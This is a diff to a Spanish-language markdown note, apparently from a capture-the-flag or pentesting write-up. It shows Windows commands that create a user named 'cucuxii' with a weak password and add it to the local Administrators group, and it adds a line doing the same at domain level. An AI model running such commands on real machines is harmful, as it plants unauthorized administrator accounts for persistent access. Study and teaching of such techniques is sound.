@@ -173,6 +173,7 @@ Pues era el Chrome.
 ```cmd
 C:\Users\cucuxii> net user cucuxii password123 /add             # crear el usaurio cucuxii con la contraseña password123
 C:\Users\cucuxii> net localgroup Administrators cucuxii /add    # añadirle al grupo Administradores
+C:\Users\cucuxii> net group Administrators cucuxii /domain /add  # lo mismo para dominios
 ```
 
 
